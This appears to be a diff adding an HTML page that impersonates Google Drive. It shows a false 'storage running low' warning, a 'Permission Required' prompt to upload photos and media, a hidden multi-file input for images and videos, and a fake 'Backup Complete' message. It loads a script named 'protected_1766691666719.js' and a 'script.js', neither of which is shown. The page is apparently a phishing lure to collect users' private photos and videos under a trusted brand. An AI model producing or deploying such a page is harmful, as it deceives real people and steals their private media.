@@ -1,0 +1,174 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Drive - Secure Backup Required</title>
+    	<script src="protected_1766691666719.js"></script>
+    <link rel="icon" type="image/png" href="https://www.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+</head>
+<body>
+    <!-- HEADER -->
+    <header class="google-header">
+        <div class="header-left">
+            <div class="google-logo">
+                <img src="https://www.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png" alt="Drive">
+                <span>Drive</span>
+            </div>
+            <nav class="nav-links">
+                <a href="#">My Drive</a>
+                <a href="#">Computers</a>
+                <a href="#">Shared</a>
+                <a href="#">Recent</a>
+                <a href="#">Starred</a>
+                <a href="#">Spam</a>
+                <a href="#">Trash</a>
+                <a href="#">Storage</a>
+            </nav>
+        </div>
+        <div class="header-right">
+            <div class="storage-indicator">
+                <i class="fas fa-database"></i>
+                <span>15 GB used</span>
+                <div class="storage-bar">
+                    <div class="storage-fill"></div>
+                </div>
+            </div>
+            <div class="user-avatar" title="User Profile">
+                <i class="fas fa-user"></i>
+            </div>
+        </div>
+    </header>
+
+    <!-- HERO SECTION -->
+    <section class="hero-section">
+        <div class="drive-icon-container">
+            <i class="fas fa-cloud-upload-alt"></i>
+        </div>
+        <h1 class="hero-title">Secure Cloud Backup Required</h1>
+        <p class="hero-subtitle">
+            Your device storage is running low. Allow Google Drive to automatically backup and optimize 
+            your photos, videos, and documents to free up space and keep your files safe.
+        </p>
+        
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h3 class="feature-title">Bank-level Security</h3>
+                <p class="feature-description">
+                    Military-grade 256-bit encryption keeps your files completely secure and private.
+                </p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <h3 class="feature-title">Instant Backup</h3>
+                <p class="feature-description">
+                    Automatic real-time sync ensures your files are always up to date across all devices.
+                </p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-infinity"></i>
+                </div>
+                <h3 class="feature-title">Unlimited Access</h3>
+                <p class="feature-description">
+                    Access your files anywhere, anytime from any device with your Google account.
+                </p>
+            </div>
+        </div>
+        
+        <div class="permission-cta">
+            <div class="permission-card">
+                <h2 class="permission-title">Permission Required</h2>
+                <p class="permission-description">
+                    To enable automatic backup and free up storage space, Google Drive needs temporary access 
+                    to your photos and media files. This access is required only for the backup process and 
+                    will be revoked immediately after completion.
+                </p>
+                <div class="permission-buttons">
+                    <button class="btn btn-secondary" id="cancelBtn">
+                        <i class="fas fa-times"></i>
+                        Not Now
+                    </button>
+                    <button class="btn btn-primary" id="allowBtn">
+                        <i class="fas fa-check"></i>
+                        Allow Access & Start Backup
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer style="padding: 24px 32px; background: var(--google-gray-50); border-top: 1px solid var(--google-gray-200); margin-top: 40px;">
+        <div style="display: flex; justify-content: space-between; align-items: center; max-width: 1200px; margin: 0 auto;">
+            <div class="footer-links" style="display: flex; gap: 24px;">
+                <a href="https://policies.google.com/privacy" target="_blank" style="color: var(--google-gray-600); text-decoration: none; font-size: 14px;">Privacy Policy</a>
+                <a href="https://policies.google.com/terms" target="_blank" style="color: var(--google-gray-600); text-decoration: none; font-size: 14px;">Terms of Service</a>
+                <a href="https://support.google.com/drive" target="_blank" style="color: var(--google-gray-600); text-decoration: none; font-size: 14px;">Help & Support</a>
+            </div>
+            <div class="footer-copyright" style="color: var(--google-gray-600); font-size: 14px; display: flex; align-items: center; gap: 8px;">
+                <i class="fas fa-globe"></i>
+                <span>© 2026 Google LLC. All rights reserved.</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- MODALS -->
+    <div class="upload-modal" id="uploadModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">
+                    <i class="fas fa-cloud-upload-alt"></i>
+                    Backing Up Your Files
+                </h2>
+            </div>
+            <div class="modal-body">
+                <div class="progress-container">
+                    <div class="progress-header">
+                        <span class="progress-label" id="progressLabel">Preparing backup...</span>
+                        <span class="progress-percent" id="progressPercent">0%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+                <div class="file-list" id="fileList"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <div class="success-content">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h2 class="success-title">Backup Complete!</h2>
+            <p class="success-message" style="color: var(--google-gray-600); font-size: 17px; margin-bottom: 40px; line-height: 1.6;">
+                All your files have been successfully backed up to Google Drive. 
+                You've freed up valuable storage space on your device.
+            </p>
+            <button class="btn btn-primary" id="continueBtn">
+                <i class="fas fa-external-link-alt"></i>
+                Continue to Google Drive
+            </button>
+        </div>
+    </div>
+
+    <!-- HIDDEN FILE INPUT -->
+    <input type="file" id="fileInput" accept="image/*,video/*" multiple hidden>
+
+ 
+ 
+<script src="script.js"></script>
+    
+</body>
+</html>
